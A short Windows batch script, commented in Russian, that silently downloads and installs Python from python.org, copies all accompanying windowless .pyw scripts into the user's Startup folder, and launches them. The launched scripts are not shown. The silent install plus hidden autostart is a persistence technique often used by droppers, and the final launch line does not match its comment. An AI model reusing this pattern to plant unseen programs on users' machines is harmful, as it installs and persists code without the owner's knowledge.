@echo off

REM Проверяем, установлен ли Python
python --version >nul 2>&1
if %errorlevel% neq 0 (
    echo Python не найден. Загружаем и устанавливаем Python.

    REM Загрузка Python
    powershell -Command "Invoke-WebRequest -Uri 'https://www.python.org/ftp/python/3.11.5/python-3.11.5-amd64.exe' -OutFile 'python-installer.exe'"

    REM Установка Python в тихом режиме и добавление его в PATH
    start /wait python-installer.exe /quiet InstallAllUsers=1 PrependPath=1

    REM Удаление установщика после установки
    del python-installer.exe

    echo Установка Python завершена.
) else (
    echo Python уже установлен.
)

REM Копируем все .pyw файлы в автозагрузку
copy "%~dp0\*.pyw" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

REM Запускаем trig.pyw с помощью python
start "" python "%~dp0\*.pyw"

